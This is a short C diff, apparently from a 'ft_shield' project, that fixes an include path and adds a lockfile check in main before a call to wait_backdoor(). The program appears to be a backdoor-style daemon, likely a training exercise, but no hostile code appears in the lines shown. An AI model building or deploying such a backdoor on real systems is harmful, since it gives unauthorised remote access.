@@ -1,4 +1,4 @@
-#include "../include/ft_shield.h"
+#include "ft_shield.h"
 
 volatile sig_atomic_t g_sigint_received = 0;
 volatile sig_atomic_t g_sigalrm_received = 0;
@@ -79,6 +79,10 @@ int main(int argc, char **argv, char **env)
     {
         free(shield);
         return (1);
+    }
+    if (ft_lockfile() < 0) {
+        free(shield);
+		return (-1);
     }
 
     if (wait_backdoor())
